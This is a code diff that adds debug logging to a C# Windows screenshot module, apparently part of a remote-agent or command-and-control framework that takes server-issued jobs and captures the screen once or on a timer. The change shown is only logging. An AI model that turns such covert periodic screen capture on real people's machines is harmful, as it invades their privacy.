@@ -29,18 +29,22 @@ namespace Workflow
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
             if(args is null){
+                DebugLog.Log($"{Name} args null [{job.task.id}]");
                 return;
             }
 
             if (args.interval <= 0)
             {
+                DebugLog.Log($"{Name} single capture [{job.task.id}]");
                 await CaptureAndSendScreenshot(job.task.id);
                 cts.Cancel();
             }
             else
             {
+                DebugLog.Log($"{Name} interval capture every {args.interval}s [{job.task.id}]");
                 cts = new CancellationTokenSource();
                 screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
                 screenshotTimer.Elapsed += async (sender, e) =>
@@ -61,6 +65,7 @@ namespace Workflow
                     task_id = job.task.id,
                 });
             }
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
         [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         private async Task CaptureAndSendScreenshot(string task_id)
@@ -121,6 +126,7 @@ namespace Workflow
             }
             catch (Exception e)
             {
+                DebugLog.Log($"{Name} capture error: {e.Message}");
                 messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
             }
         }
